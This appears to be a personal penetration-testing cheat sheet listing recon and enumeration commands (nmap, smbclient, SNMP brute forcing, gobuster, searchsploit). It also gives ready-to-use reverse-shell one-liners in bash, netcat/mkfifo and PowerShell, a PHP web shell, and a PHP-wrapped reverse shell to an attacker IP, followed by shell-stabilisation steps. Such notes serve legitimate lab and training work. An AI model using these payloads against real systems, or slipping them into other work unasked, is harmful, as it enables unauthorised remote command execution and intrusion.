
Tools 

SSH 
```
ssh user@IP 
ssh-keygen -f key 
```
SCP
```
scp linenum.sh user@remotehost:/tmp/linenum.sh
```
Netcat
```
nc IP port
nc -nlvp port 
```

socat is a tool similar to netcat 

Tmux 
```
sudo apt install tmux -y 
tmux 

```
Ctrl+B is command prefix
C to open a new window 
0 or 1 to switch windows 
Shift+% to split vertical
Shift+ " to split horizontal 
Left and right to swtich 

VIM
```
vim filename 
```
:1 go to line number 1 

Nmap 
```
nmap -sC -sV -p- IP 
```

SMBclient 
```

smbclient -N -L \\\\10.129.42.253 (no password)

smbclient \\\\10.129.42.253\\users

smbclient -U bob \\\\10.129.42.253\\users

```

SNMP 
```
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
snmpwalk -v 2c -c private  10.129.42.253 
```

Onesixtyone (brute force community string)
```
onesixtyone -c dict.txt 10.129.42.254

```

Gobuster 
```
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```


Seclists
```
sudo apt install seclists -y 
```

Banner Grabbing with curl 
```
curl -IL http://website.com 
```

Whatweb 
```
whatweb host 
whatweb --no-errors host 
```

searchsploit
```
searchsploit thing
searchsploit -m exploitID 
```

Helpful Reverse Shell commands 
```

bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

```
PHP
```
<?php system('id'); ?>

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>

```
Fixing a shell 
```
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
AFter Ctrl+z 
```
stty raw -echo 
fg 
```

Simple Python server
```
sudo python3 -m http.server 8080
```
